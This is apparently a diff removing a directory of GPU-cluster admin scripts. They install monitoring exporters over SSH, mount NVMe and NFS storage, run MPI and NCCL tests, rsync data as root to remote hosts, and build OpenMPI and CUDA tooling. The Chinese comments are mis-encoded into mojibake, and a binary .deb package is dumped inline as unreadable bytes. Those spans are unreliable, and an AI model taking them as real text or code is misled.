-non_root_servers=("10.254.45.33")
-#root_servers=("172.16.10.25")
-username=$(whoami)
-for i in "${non_root_servers[@]}"; do
-  ssh -i /home/$username/.ssh/id_rsa $username@$i '
-    echo $HOSTNAME;
-    export package_dir=/data/apps/monitor;
-    cd $package_dir;
-    sudo tar xf prometheus.tar.gz -C /opt/monitor;
-    sudo dpkg -i datacenter-gpu-manager_3.3.8_amd64.deb;
-    sudo cp dcp-metrics-all.csv /etc;
-    sudo dpkg -i dcgm_exporter_pcie_3.3.8_amd64.deb;
-    sudo dpkg -i node_exporter_1.8.2-amd64.deb;
-    sudo systemctl status node_exporter;
-    sudo systemctl enable node_exporter;
-    sudo systemctl status dcgm_exporter;
-    sudo systemctl enable dcgm_exporter
-  ';
-done
-
-
-for i in "${root_servers[@]}"; do
-  ssh -i /root/.ssh/id_rsa root@$i '
-    echo $HOSTNAME;
-    export package_dir=/data/apps/monitor;
-    cd $package_dir;
-    tar xf prometheus.tar.gz -C /opt/monitor;
-    dpkg -i datacenter-gpu-manager_3.3.8_amd64.deb;
-    cp dcp-metrics-all.csv /etc;
-== /root/conf/mount.sh
-for i in g{0003..0016}; do 
-    ssh "$i" '
-        echo $HOSTNAME
-        # å®šä¹‰è®¾å¤‡å’ŒæŒ‚è½½ç‚¹çš„æ•°ç»„
-        DEVICES=(/dev/nvme0n1 /dev/nvme1n1 /dev/nvme2n1 /dev/nvme3n1)
-        MOUNT_POINTS=(/ssd1 /ssd2 /ssd3 /ssd4)
-        
-        # å¾ªç¯å¤„ç†æ¯ä¸ªè®¾å¤‡å’ŒæŒ‚è½½ç‚¹
-        for index in ${!DEVICES[@]}; do
-            DEVICE=${DEVICES[$index]}
-            MOUNT_POINT=${MOUNT_POINTS[$index]}
-            
-            # åˆ›å»ºæŒ‚è½½ç‚¹
-            mkdir -p $MOUNT_POINT
-            
-            # è·å–è®¾å¤‡çš„ UUID å¹¶æ·»åŠ åˆ° /etc/fstab
-            UUID=$(blkid | grep "$DEVICE" | awk "{print \$2}")
-            echo "${UUID} ${MOUNT_POINT} ext4 defaults 0 0" >> /etc/fstab
-        done
-        
-        # æŒ‚è½½æ‰€æœ‰æœªæŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿ
-        mount -a
-    '
-done
-== /root/conf/mountnfs.sh
-#!/bin/bash
-apt -y install nfs-common
-mkdir -p /data/apps
-mount -t nfs -o vers=3,nolock,proto=tcp,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport 10.31.17.2:/ssd/apps /data/apps
-
-#echo "mount -t nfs -o vers=3,nolock,proto=tcp,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport 10.31.17.2:/ssd/apps /data/apps" >> /etc/rc.local
-== /root/conf/mpi.sh
-#!/bin/bash
-
-# è®¾ç½®èµ·å§‹å’Œç»“æŸèŠ‚ç‚¹ç¼–å·
-START_NODE=35
-END_NODE=125
-
-# éå†èŠ‚ç‚¹èŒƒå›´ï¼ŒæŒ‰è§„å¾‹æ‰§è¡Œ mpirun å‘½ä»¤
-for i in $(seq -f "node%03g" $START_NODE $((END_NODE - 1))); do
-    # è·å–å½“å‰èŠ‚ç‚¹å’Œä¸‹ä¸€ä¸ªèŠ‚ç‚¹
-    CURRENT_NODE=$i
-    NEXT_NODE=$(printf "node%03d" $((10#${i:4} + 1))) # è‡ªåŠ¨è®¡ç®—ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ç¼–å·
-
-    # ç”Ÿæˆ mpirun å‘½ä»¤
-    CMD="/gpfs01/nccl-tests/openmpi/bin/mpirun -np 2 -H ${CURRENT_NODE}:1,${NEXT_NODE}:1 hostname"
-    echo "æ‰§è¡Œå‘½ä»¤: $CMD"
-
-    # æ‰§è¡Œå‘½ä»¤
-    $CMD
-
-    # æ£€æŸ¥å‘½ä»¤æ˜¯å¦æˆåŠŸ
-    if [ $? -ne 0 ]; then
-        echo "å‘½ä»¤å¤±è´¥: $CMD"
-        exit 1
-    fi
-done
-
-echo "æ‰€æœ‰æµ‹è¯•å®Œæˆï¼"
-
-== /root/conf/multi_trans.sh
-#!/bin/bash
-set -eo pipefail
-
-# ----------------------
-# é…ç½®å‚æ•°
-# ----------------------
-REMOTE_USER="root"
-REMOTE_HOST="183.147.142.41"
-REMOTE_PORT="10006"
-SSH_KEY="/root/.g0016_id_rsa"
-
-SRC_SSD_HOME="/data/group/wenge"                     # æœ¬åœ°çˆ¶ç›®å½•ï¼ˆä¸è¦å¸¦é€šé…ç¬¦ï¼‰
-DEST_SSD_HOME="/data/group"                    # è¿œç¨‹ç›®æ ‡ç›®å½•
-
-DIRECTORIES=("$SRC_SSD_HOME")            # è¦åŒæ­¥çš„æœ¬åœ°ç›®å½•
-REMOTE_DIRECTORIES=("$DEST_SSD_HOME")    # å¯¹åº”çš„è¿œç¨‹ç›®å½•
-NUM_PROCESSES=16                          # å¹¶å‘è¿›ç¨‹æ•°
-MAX_RETRIES=3                            # æœ€å¤§é‡è¯•æ¬¡æ•°
-
-# ----------------------
-# åˆå§‹åŒ–å˜é‡
-# ----------------------
-declare -A TOTAL_SIZE                    # æ€»å¤§å°ç»Ÿè®¡
-declare -A COMPLETED_SIZE                # å·²å®Œæˆå¤§å°ç»Ÿè®¡
-TMP_DIR="/tmp/rsync_parallel_$$"         # ä¸´æ—¶ç›®å½•
-mkdir -p "$TMP_DIR"
-
-# ----------------------
-# å·¥å…·å‡½æ•°
-# ----------------------
-== /root/conf/multitrans.sh
-#!/bin/bash
-set -eo pipefail
-
-# ----------------------
-# é…ç½®å‚æ•°
-# ----------------------
-REMOTE_USER="root"
-REMOTE_HOST="10.100.254.47"
-REMOTE_PORT="22"
-SSH_KEY="/root/.ssh/id_rsa"
-
-SRC_SSD_HOME="/data/"                     # æœ¬åœ°çˆ¶ç›®å½•ï¼ˆä¸è¦å¸¦é€šé…ç¬¦ï¼‰
-DEST_SSD_HOME="/shuju/back_data"                    # è¿œç¨‹ç›®æ ‡ç›®å½•
-
-DIRECTORIES=("$SRC_SSD_HOME")            # è¦åŒæ­¥çš„æœ¬åœ°ç›®å½•
-REMOTE_DIRECTORIES=("$DEST_SSD_HOME")    # å¯¹åº”çš„è¿œç¨‹ç›®å½•
-NUM_PROCESSES=16                          # å¹¶å‘è¿›ç¨‹æ•°
-MAX_RETRIES=3                            # æœ€å¤§é‡è¯•æ¬¡æ•°
-
-# ----------------------
-# åˆå§‹åŒ–å˜é‡
-# ----------------------
-declare -A TOTAL_SIZE                    # æ€»å¤§å°ç»Ÿè®¡
-declare -A COMPLETED_SIZE                # å·²å®Œæˆå¤§å°ç»Ÿè®¡
-TMP_DIR="/tmp/rsync_parallel_$$"         # ä¸´æ—¶ç›®å½•
-mkdir -p "$TMP_DIR"
-
-# ----------------------
-# å·¥å…·å‡½æ•°
-# ----------------------
-== /root/conf/nccl-tests.sh
-cd /data/apps/nccl-tests-master
-#å•èŠ‚ç‚¹
-make -j12 CUDA_HOME=/data/apps/cuda/12.4 NCCL_HOME=/data/apps/nccl-master/build
-#å¤šèŠ‚ç‚¹
-#make -j12 MPI=1 MPI_HOME=/data/apps/openmpi CUDA_HOME=/data/apps/cuda/12.4 NCCL_HOME=/data/apps/nccl-master/build
-== /root/conf/nccl.sh
-apt install unzip
-cd /data/apps/nccl-master
-make -j 12 src.build NVCC_GENCODE="-gencode=arch=compute_80,code=sm_80"  CUDA_HOME=/data/apps/cuda/12.4
-== /root/conf/nccl_test
-== /root/conf/net-tools.sh
-#! /bin/bash
-# Create By GF 2023-03-21 17:23
-
-# Need File : net-tools-2.10.tar.xz
-
-STORAGE=$PWD
-
-# Function: ç¼–è¯‘å®‰è£…(Compile Install) net-tools-2.10
-# ##################################################
-function compile_install_net_tools_2_10() {
-
-    if [[ ! -f "/usr/bin/ifconfig" ]]; then
-    
-        local verify
-    
-        read -p "[Confirm] Compile and Install ( net-tools-2.10 )? (y/n)>" verify
-        
-        if [[ "$verify" != "y" ]]; then exit 1; fi
-
-        tar xvJf $STORAGE/net-tools-2.10.tar.xz && \
-	                                               \
-        cd $STORAGE/net-tools-2.10              && \
-	                                               \
-        yes "" | make config                    && \
-	                                               \
-        make && make install                    && \
-	                                               \
-        cd $STORAGE                             && \
-                                                   \
-        rm -rf $STORAGE/net-tools-2.10          && \
-== /root/conf/nolinuxupgrades
-Package: linux-*
-Pin: version *
-Pin-Priority: -1== /root/conf/nv_gpu_conf.sh
-#!/bin/bash
-##set Persistence-M for nvidia gpu driver(eg. nvidia-smi -pm 1)
-
-dir=$(cd `dirname $0`;pwd)
-
-is_nv_gpu_host()
-{
-    gpu_info=$(lspci | grep NVIDIA)
-    if [ ${#gpu_info} -gt 0 ];then
-        echo "nvidia gpu host"
-        return 1
-    fi  
-
-    return 0
-}
-
-is_gpu_driver_installed()
-{
-    driver_info=$(lsmod | grep nvidia)
-    if [ ${#driver_info} -gt 0 ];then
-        return 1
-    fi  
-    
-    return 0
-}
-
-is_nv_gpu_host
-if [ $? -eq 0 ];then
-    echo "not nvidia gpu host. exit"
-    exit 0
-== /root/conf/nvidia-container-toolkit.sh
-sudo apt-get update && sudo apt-get install -y --no-install-recommends \
-   curl \
-   gnupg2
-
-curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey | sudo gpg --dearmor -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg \
-  && curl -s -L https://nvidia.github.io/libnvidia-container/stable/deb/nvidia-container-toolkit.list | \
-    sed 's#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g' | \
-    sudo tee /etc/apt/sources.list.d/nvidia-container-toolkit.list
-
-sudo sed -i -e '/experimental/ s/^#//g' /etc/apt/sources.list.d/nvidia-container-toolkit.list
-sudo apt-get update -y
-export NVIDIA_CONTAINER_TOOLKIT_VERSION=1.18.1-1
-  sudo apt-get install -y \
-      nvidia-container-toolkit=${NVIDIA_CONTAINER_TOOLKIT_VERSION} \
-      nvidia-container-toolkit-base=${NVIDIA_CONTAINER_TOOLKIT_VERSION} \
-      libnvidia-container-tools=${NVIDIA_CONTAINER_TOOLKIT_VERSION} \
-      libnvidia-container1=${NVIDIA_CONTAINER_TOOLKIT_VERSION}
-
-sudo nvidia-ctk runtime configure --runtime=docker
-== /root/conf/nvidia.sh
-#!/bin/bash
-cat <<EOF | sudo tee /etc/modprobe.d/nvidia.conf
-options nvidia NVreg_EnableStreamMemOPs=1 NVreg_RegistryDwords="PeerMappingOverride=1;"
-EOF
-sudo update-initramfs -k $(uname -r) -c
-== /root/conf/nvlsm_2025.03.1-1_amd64.deb
-!<arch>
-debian-binary   1741176740  0     0     100644  4         `
-2.0
-control.tar.xz  1741176740  0     0     100644  812       `
-ı7zXZ  æÖ´FÀê€P!       ’s	ià'ÿâ] ¼}•ÀJ>yÂÌ&£^ ÄÈæİ.DV©¼vÇ¨4$=»Ãfˆª¤Õ«Ûõä)¬Ğ£Ëæ‰Iı'¥#VO™´r¸¹şjÆ÷^=>ê>Ì.&pÒ^qHÑC½‰GÎ:`«[!“œRÔtû^~ûä&ê‹H±d"»¦®_¿y•9FlĞ¦¡’»$pÂ~"ƒ¢»Ù¡Ì?k'b›ö.e#³ÛÍ¹L«ò~s…0¢‚k6bm3R•!Z ‹»>¢ØŸÌ£R19Ø:1´’†·òÙ®ÿ'¡rÙ¾viJ§hï0î¡QK@Ñxv´….QP¹R¶KìYyÄèà™ğìø!³Ö°*™?—k¥q2Œ™ÏˆÃ_×²¬¹Ò³şĞ…êœ9S[MÔÇÌ¤Óó[‰É±ÂŸ_`AŸ oEf‡=)îçÉ#Òz;|©Èú[|³MĞ‘ıí¢0$‡H+­˜¦B8€ĞŠÇ2<¾ƒ)LÑ…Fîg$RE­ğÆI‡ çW¼Õí§­~S–H7ğ-Ø)ÉÏf&õ1á‹1·µ1ŸJ.!¿DÍvû«¹ú$uøÈ¶_N•ğ¸Sø›øHÎ*O¡d ãH_ 4&4¥®êr„Cöÿr,f¨½ˆ‘VñĞœÏÓT-Z	%ØÿêÇšèĞƒ»™MëYzüuëÛÂúî·“ã2¸yR>|UÇ½‰şŞ"}Ë‰¹hÂè  æ›[)ºÚ½|i[¦çÏga¼çöj>²©|
-6¬;@úö.â¤%¢A<'jóD	#ùÚjâÎ¯İ†¡Ä‡Ä(İ±Ö‚³0ìø¸F•ğCYB¸
-D¶…ñœ!Îtûêşİ‚2ftÅ×Z|î è…1
-3†§àITµRT¦©Ø+öi«ç¿ı,Æ­ß€gÆİÆÏ»J'Cpaá×¶³NñP]aÑ”ÅÎDÅ ÷“œXî‰,Bu    I•8¸u,v †€P  3N±Ägû    YZdata.tar.xz     1741176740  0     0     100644  6777100   `
-ı7zXZ  æÖ´FÀúÄš€€€!   şÉ Uáæïÿ] ¼}•ÀJ>yÂÌ&£^ ÄÈæİ.DV©¼vÇ¨4$=»Ãfˆª¤Õ«Ûõä)¬Ğ£Ëæ‰O€—¡Ë$wIuóÚ4XÂÏ÷È·í$Ñ®–/)™º9€	as¹ïØk2Ã"ñÏï\§ÊO­ÍÙÅLŸÂ¼3_Ówy(«!óÿ‹sè\v 3KŞmŞWˆ#„–6ä¾ñŸ¥ø —å¬9OVêN¿ˆ\– f®ü+úªÔQ,ÓœË:Ì¶”~…f‹-çjf¥6ñZæi±ƒH¶ÈnÔìÊ·×„[™ÌGºn«f°İïú\€À;„ƒÜZÂá ê5ïŸ­¤ó®©‡¨ÖøN±Òß#Ñ£ıV¡á÷ßû·òºLiçd†#$tÅ
-„–¿4¤pñé}@{… Dg”NÌ\cj†£óClw·Úä§7kPŒ¢Ò©lubDDï °Û‹àW‡Éq×‘ 1;ƒ åxøÔ™®Ãù½›ÉOGÉtS¦ m,Çÿ¤(a8çd—I.U™S{Qô?Š,‰Õx*šû—‹ŞndÓ«åKÕj°÷¢3¹q°¯(Éùèµ	ğã'+˜Y Á$É+BÖ©Pè–÷¶påÃí.u—Áä'g/Àı†ŞÍ»ƒö[BTrí×c‹í¶„Ê–1ÊÛ,
-ø{ü™Ô9€2Àó•áà‡¾	ÂÂSr`˜s½şŸÀe¤•';ğ¡èûns_ã·ß•P¿·ÖJ0òß¾HÁÌ?J(64«}	Ã…ƒl)¢<§XØÒ›*ñßª×j! w•ño’¾E¶ãbÒ¥üyˆƒ³Åµˆ,ŠÂõ(óñèã”{Î¨7>xƒ‚’ÜGş±ä÷í¢ípÄÜ R¸8ü|¯$:…Wv»ô]İ3)ÉTì~ Û­‰FÜñvCkÁr¹ĞC	²vÿvÌ	»•ßŞ°€dI !E!J®Ú!ºU$^Õ9ÅXüÉK_¢ÏÌô €>Ú†8òîNXıµ/ØØÑr›#X¤´§dÈáîQ{ô¦˜(÷¬B¡ls"àã
-·ë®¾w½Ô¸ƒq£İùPÌË\­KÂµ~y*¸ŠPT·|5/«G‰WV.Bƒe>|İİ¬0µ
-åĞâÖ"nîf°ı¡R(5ùâÇÖzğòWÍ7œSœ÷28ø5ãç¿È^!ÅÅöe¬R£ø
-{êër¯ËEWSáB¯oÁÍ3qÚIÎöË•WdIº7XğfÕ1ş
-ï”
-²áf¢G¤rd8§@¿Ÿ Èo¥>­›;¼‹®m‰ÅppHumà„„Õ’³ñ™QfX”ñÇ;ü\Yˆq9÷×kªÅŞ_ö–±ÅÈ[Îˆ–«Ókúäù–qváQ™Oû#ww#/;ºúÀrœO(ºVğRğŠm—é(),èØ|%ã]ãW¿0lÛ—ÃŸĞ $óñJøÑ)$Œ8à?(Ó‘é`âÒn«>s+äî.ÖËn÷—@“‚%‹s2ÁSëàz€şßÉ9À:!›ê,Úk|˜°Ëˆ¡/ã†¤äŒëÿ¬%11±¹gæºü ‡ÒI!ñ'YLYyµ’wH×BxùÌËWãÿã¶ÔVSA™…O¥WW
-ëµÜDdíœi€z‚±µå¢’6—ÜĞºBJL#¬3§ÓpÁ»€?âÆ"ÇøØpºwÆ¨Óƒç•Òä£#€g„kP­½Üj#©T­×æº@ñ÷´à¢K?ÜìDà^û«B¹M‹ë´¦eŒ\óDA73aŒAî~*[½~ocÔ¹Ü®R‚-ËìÖï¤]ÿí1y“`E ]¯İµ{C§½üfUùÌ$A,% ~€^jQ´äSëodÈ…¨dé®ÎAtû½³%î{ªšâõ´İ¯2¯  úS…•òÛš5dH7Õ‰<İH¥Ç@b’æŞ[³ãG<ü«árBö€$YşQyÌâP8r,ä&ÑŸ­¼}
-'ºº‰Jöş
--deâŒÈLVuœòÈq?¦ú^|´è_t½”QÀ§şõW½³^^½ÆÊ|+­©hP'Ey‚àè÷öæ\3ßA×ï¡y¢ÎÎe\Ã®ş¡²Apo½¢ì[@«@äRêQ§ÒA–^’UJÜ¨Gø£ã,Šíû¬pİ_T|ªğ0;ú —ıV>–+÷	ùüj{ VşÚ-s°‰Â-¯Ë;è¥¨’«ê®…mÖ
-Utlú>èŞwš¤»Wt›8!¨dØoÄîHÆHŸt%kÿ« Ïqø£TşXzMOm¦¨Ç¨½ßéµ)íëÈCK¤9?UegššxÇ·y×÷µµXñÂf¥Ä{iŸ"G\2HÏI¬‘®îmê¸‘p¥!8ô~±4Ãi/5 u¹Ó,¥œp«Šzı¤¦†µĞÃºCb…ì-
-8r™ç”‹­?²Å”YŒ)°©ŞJkès8‘=$ÙúşÔ®Ùf1)›ˆE:çt¼5¢XæÏ€íwC¹™¦×Ñ¼3kM=GÛ¡"Œè\¸S"ÄÎ›¥~KÖ&å‰MTO°:XŞFÅšƒubiÚóÕE¾p8ŞÜ•ú¤9E¢›¥¾á<*ª¦¦ã ‰M2ÉdŠ>cë±Ì`®İ¾^XË„¨Ñ…9š"tÅºûdÒ	œƒ!³#œ‚Ä¢öœsH3Ä$ñ[£Ë¦¶aÍiÜ±CÆŸœ
-r„cÓµFŞ[~x+¼ä(§hE¾„–h¸P¶5Ic_¤ú›×Sµôæ}Ï@8±œYæ¸+*#C¸u—Òù‡ş•*­kÊÇÈ\riD0Ò ü–Yt"È=KÓöÔµØ½å”Ã7Cë>;ÍhS’45	˜3	Y°ŠRXû9ÒêøÖ—35|ğUje¶6>8‰ä1|’ÂÂ¡ˆjĞõKiËºl‡<.iÄ‚Oj”ú.Ôñ‰ìçÕ¶™ÙfìïÙê¯×Á™¶ª#ğ	vÕjv´Éu—]Ë	U/Ù¶Ù"‚.^Q tR¦ßÆ_¥Ù{,Jìr‚ ¶=´•”ñ¤ä±ÎxB9ïqØû7å¶¿¢9kËó5{ö®ÉÔ‰«5o©Ñ_Y¢ OÆCNàW„BvToÑ}Ï°'(wS“wíõ•Çõ!·Rã.2xasÁCü°A—'ZÂN¸ËCã¸!·{ÖÑO¡PÚşùü­¤Ä›–4òéîÆ!ÒŒ^	¯ÕüIG_Afœk9†ƒrzÍYYHwEs7è³‰Ìè‰’ìênEc¤{Ò"§]5äÏĞ“%_ä¨‚Ù\BÚ³(ÂãkyW¯8ˆø‹Qù¥nx‹­W)—èÄ‰O£Şè•vÿn)0c;'n¦%óa£¦ÎE®ñÈÂÂÖÎxé|İêRS=ßÏÁÊíó»^™L:]|–Œ<tÓ'šŠfªÕb~g×ì‘à%÷Æm°¼¦XèÂ½ªÀƒªU]Ğ§ëÆ_«c0ˆ¦’2ñğsfşrÆÌÀhoÀ´ã´iÖv?³M_¥Q÷~NÈ[yš8Ú4¬šó²]˜›UkëÚ?Ô_éÜ¾Ï~ú’äJ6àßjœ×i{qè²ûyõÈÀ‰Sª‰ØKO ÷–ì+Rnäè¼8—Bj²/I(²M>köãÚw±Lk½Ç`4èX8ª›×.2—(©_‘¤}-x'U°HJÆô<ò#L<‘<Â²]ÀGkz‰pE¬‹Ø© O›áL	†ûûÃòyÑÈê—°ãÅÍÿ¬¸°ĞAØ_ô–]&]Š0n`'Ü%“Ø´üeW«ÊS§/)=±‡uµ/Xy›’ô<9'ÛÇãIé[ÑÙ¿ñ¬+ãñºvY³ÄˆD¡)ãË=:ÔjÄwç@À»­4™§™Óÿğ)£q*8Ï§5hò;ñGy$ÑuùrçáìïoBåCÀ–áVÑZ§ğeã}_×L(jşÇ•¶8šğ 
-.oC®Òïéèm'©G—»Të£Îc®ª É••itÚÑGğÙ˜o+ñ£æ²†‹rdÄû-b‚ìÌéAèĞ;¤‹ßş®^D3“XÑÿ-‘zu}0T³A—FD˜Z`÷Åíj("™ÄQ!m¡F°(b¾r·.ç‚ÒÄÆ¨Jô.­ª
-ÔÊˆ¶‘nRfºÅzC¦Éz8bû“Bb‘u¤¹b%À%µŠVÑ†ªAj Pš˜¹¥õ›®qU)ğGòI¡ëx­¦ÕˆµQ´\››Pq€Îš”ˆëq_­o÷ï±àÃP0˜ø¹`˜ +e¤U­Œ}b¾±ÏÚ)$´Ú€uäß ÎYg)òñ(©zwİ¯y‹}æJµÛ…yöòÌ*¦Sæ<¿*}¥^p…Õçl¦¨N;#6¹Œ.\y ÎáûÚŠ:©¨\ ó&9o34lpÇôÁõa&³ïàö¡Ô#`å•÷˜š5dN÷åæù%Î=('5xoe7ßŒ|à–¾±cæ2ÙªkW…™{uõÊW÷±bì¹RÏBSwÄÜ³4„…†®+¶‹ÙKpÎWşIØÂ**
-ú8–T¬˜<ïÕNuğ‹€Å1âh3…/"ö›‹î£~ÕBé$™,ZŸä°ö§	$Láìê1¹ÒÀuÛ×y’î…£ÀfÜs~aê9w”KG+èb$òôšÜ2XˆiYs¤¤Ñ©mGò~…QÚÉßÊ¢­ûÚßıÙ“ıÄŞ#òÒ÷IN>{/G÷’;Öz£¶/mnlÈ¦©AÿpE<¯u¾|mS]Ògl|„Š3-Ñ‹ñ¹kŠU­™İ®ÔÀ3Zúíä(Uè×İ„œÅaªóVqõÃ:~²ì‡¤šı33-jyQĞÌ;Ã˜UìşÕåöN2°‰súô¤Ù…‚ùóz‡Ùl°«–Víaœ°fäŞ–wÓ=YÍîâRŸä/°Õ£µÇ…jİ¡l¨¼@½±ğæÛ`O]t§E”ê÷…N­ŞóØ~_;XRHì°~OrğÃ:”x¤
-²¡¸¦ºêÈR¾?Õ³"qUŠÊD†–&ºœ`Õ¨L[éâH»íYba}‰ô~– énÆºÁxE3âêKß H5ìËB>Zê#Sr8C¬©‚–æµ]æ9åÉEÊÒblÀ Î×·n£hÌaØ–u"X×£6­{ÿjZw'ôCğ[øÁü^Ö~<È‰ÎÙYÔÁ{ú°ºRµ;dÃªÌ¦„Ò}Rï£Uå™”HÒ6#ìuu(í¦ô^ömdŸ_Ò¹v‡/œáÑÀ–§6œZ0–G
-eAkñjû$@&=}g½I°Ä?a}îïÅ«ùBÆÅ¦ìzÎËfÏGÒqˆûSr—Ÿwô¿|ÊÒİÁÅ
-›øœ £÷6®ëÀ {-/Ê‡7èdÚ—4®Ò2¦eû{­hÛ³›¬^[QO€eäj€iÔ%.¹ĞÕ.İ%
-µßÆ²Ô«3Ù¨IP¾Aæ|àY’’q@heĞ|¡ÔŒ3:f³ßüÖ-jÏĞ@ºPæ@"ê‘ÈM ºåÅ"=f¸3­j8£GÂYú¨ó5Ã¢@‡Kƒqš@dÛ>êq2Æjg#&6èê'öNjb‡¾™RáksLÑÑ¾1äÜ8†209š)‡Ï”×™ègD£YGãÊõ}ÿ1 × ß^‘ ²¸RJó?a¹qCÈûæ—çµç‹@³KšÇíjÖ_·ÅÇë	?~n-èèÏ`ĞEŸ¢a‰àÍ£ÌŞq4w ˜2œØ >›º®ßQnE³Cº.6ÉjkUh'‘B%Şñk:?˜ú•¹ù©„â·7ªew|cœÇJ…ÓI`eˆ^~“¨Ò¥Éì	²øÿÈñPÛèÈ^ÑÓ|nI{\6$û¬’‹c"1¦=f°Á‡•$Èr³a©] aa_qÃ$—Ãi¡] ÃírÄkSp3/àí
-D{Qä‡†;†«51œtT_9JøÜS2ñdšÄ]S÷«y®†µó	f4ú³¹'ù¸Ù@<•˜é¸ŒR$¤ÕLÌÙãøRzÌªŞHA_¹¹çol“*Œo°8oú³½W‚}áøEÁhËÀ}0õ‹À9»•‹ml>ÂÂ¹Äq)ÊŒ«s0²’‚)vX³`Ñ­MxzÊèPÙFo´|™úÀK·ø5h`ıgH¯ÄB¾ŸíÅÓgb¾ à +©ùO”UìdÅKºuszB¸ñ8{i>ÅVßT÷‹jaf˜Z.™Ö5‡¹yÆ_‘'ô6 œ‰æ»X­jsçÈÄ0›Ë)™*6ÂçèbDqİn”ü«³’àq?Ÿ£fœıå¹ğû]š§ÈutNò ³øc«ç~¿æt¢C¶şáKÀ9;–ÁÙ„äkú’ÓÓÕêg°”2dçåá \8‰½†£–^.{[µQCù ‹øº+÷B7›^=¬¢‡Üµ‡	Şk†Ñ§óv$Ål1£. ¡w^îbÿXPT¢¬0D ™¤‹î=6
-== /root/conf/openmpiç¼‚æ ¬ç˜§æµ ãƒ¥å¼·modulefilesç¼‚æ §å•“.md
-1ã€cudaç¼–è¯‘å’Œå®‰è£…(æºç çº¯å‘½ä»¤è¡Œå®‰è£…)
-./cuda_12.1.0_530.30.02_linux.run --toolkitÂ --toolkitpath=/data/apps/cuda/12.1 --librarypath=/data/apps/cuda/12.1 --samples --samplespath=/data/apps/cuda/12.1 --tmpdir=/tmp --silent
-æ‰§è¡Œç»“æŸåï¼Œå®‰è£…è·¯å¾„åœ¨/data/apps/cuda/12.1
-
-
-2ã€openmpiç»“åˆcudaå®‰è£…(cuda-awareæ¨¡å¼)
-å…ˆå†³æ¡ä»¶ï¼Œéœ€å®‰è£…å¥½cudaå’Œucx
-cudaå®‰è£…æ–¹å¼è§æ­¥éª¤1,å¦‚æœåœ¨/usr/binç›®å½•ä¸‹æœ‰ucx_infoï¼Œå¯ä»¥æ‰§è¡Œucx_info -væ¥æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯ã€‚ç³»ç»Ÿå¦‚å·²å®‰è£…ucxé‚£ä¹ˆå¯ä»¥ä¸ç”¨å†é‡å¤å®‰è£…ucxï¼Œå¦‚æœæ²¡æœ‰åˆ™éœ€è¦æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ucx
-./autogen.sh && ./contrib/configure-release --enable-mt --prefix=/data/apps/ucx --with-cuda=/data/apps/cuda/12.1 && make -j4 && make install
-
-
-3ã€openmpiå®‰è£…æ–¹æ³•ï¼š
-æ³¨æ„ï¼šå¦‚æœæ²¡æœ‰éƒ¨ç½²åœ¨slurmè°ƒåº¦ç³»ç»Ÿé›†ç¾¤é‡Œé¢ï¼Œå¯ä»¥ä¸åŠ --with-slurmï¼Œå¦åˆ™å»ºè®®åŠ ä¸Šã€‚
-./configure --enable-orterun-prefix-by-default \
---enable-mpirun-prefix-by-default \ 
---enable-mpi-cxx --without-verbs \ 
---with-ucx=/data/apps/ucx \ 
---with-cuda=/data/apps/cuda/12.1 --disable-getpwuid --with-slurm \
---prefix=/data/apps/openmpi
-æ¥ä¸‹æ¥æ‰§è¡Œï¼š
-make -j 8
-make install -j 8
-
-
-4ã€moduleç»„ä»¶å®‰è£…
-#for ubuntu
-apt-get install environment-modules
-#for centos
-yum install environment-modules
-
-== /root/conf/openmpiç¼–è¯‘ä»¥åŠmodulefilesç¼–å†™.md
-1ã€cudaç¼–è¯‘å’Œå®‰è£…(æºç çº¯å‘½ä»¤è¡Œå®‰è£…)
-./cuda_12.1.0_530.30.02_linux.run --toolkitÂ --toolkitpath=/data/apps/cuda/12.1 --librarypath=/data/apps/cuda/12.1 --samples --samplespath=/data/apps/cuda/12.1 --tmpdir=/tmp --silent
-æ‰§è¡Œç»“æŸåï¼Œå®‰è£…è·¯å¾„åœ¨/data/apps/cuda/12.1
-
-
-2ã€openmpiç»“åˆcudaå®‰è£…(cuda-awareæ¨¡å¼)
-å…ˆå†³æ¡ä»¶ï¼Œéœ€å®‰è£…å¥½cudaå’Œucx
-cudaå®‰è£…æ–¹å¼è§æ­¥éª¤1,å¦‚æœåœ¨/usr/binç›®å½•ä¸‹æœ‰ucx_infoï¼Œå¯ä»¥æ‰§è¡Œucx_info -væ¥æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯ã€‚ç³»ç»Ÿå¦‚å·²å®‰è£…ucxé‚£ä¹ˆå¯ä»¥ä¸ç”¨å†é‡å¤å®‰è£…ucxï¼Œå¦‚æœæ²¡æœ‰åˆ™éœ€è¦æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ucx
-./autogen.sh && ./contrib/configure-release --enable-mt --prefix=/data/apps/ucx --with-cuda=/data/apps/cuda/12.1 && make -j4 && make install
-
-
-3ã€openmpiå®‰è£…æ–¹æ³•ï¼š
-æ³¨æ„ï¼šå¦‚æœæ²¡æœ‰éƒ¨ç½²åœ¨slurmè°ƒåº¦ç³»ç»Ÿé›†ç¾¤é‡Œé¢ï¼Œå¯ä»¥ä¸åŠ --with-slurmï¼Œå¦åˆ™å»ºè®®åŠ ä¸Šã€‚
-./configure --enable-orterun-prefix-by-default \
---enable-mpirun-prefix-by-default \ 
---enable-mpi-cxx --without-verbs \ 
---with-ucx=/data/apps/ucx \ 
---with-cuda=/data/apps/cuda/12.1 --disable-getpwuid --with-slurm \
---prefix=/data/apps/openmpi
-æ¥ä¸‹æ¥æ‰§è¡Œï¼š
-make -j 8
-make install -j 8
-
-
-4ã€moduleç»„ä»¶å®‰è£…
-#for ubuntu
-apt-get install environment-modules
-#for centos
-yum install environment-modules
-
-== /root/conf/pair_batch_nccl-tests.sh
-#!/bin/bash
-set -e
-
-# å®šä¹‰æ‰€æœ‰56ä¸ªèŠ‚ç‚¹
-#nodes=(
-#g0036 g0037 g0038 g0039 g0040 g0041 g0042 g0043 g0044 g0045
-#g0048 g0049 g0050 g0051 g0052 g0053 g0054 g0055 g0056 g0057
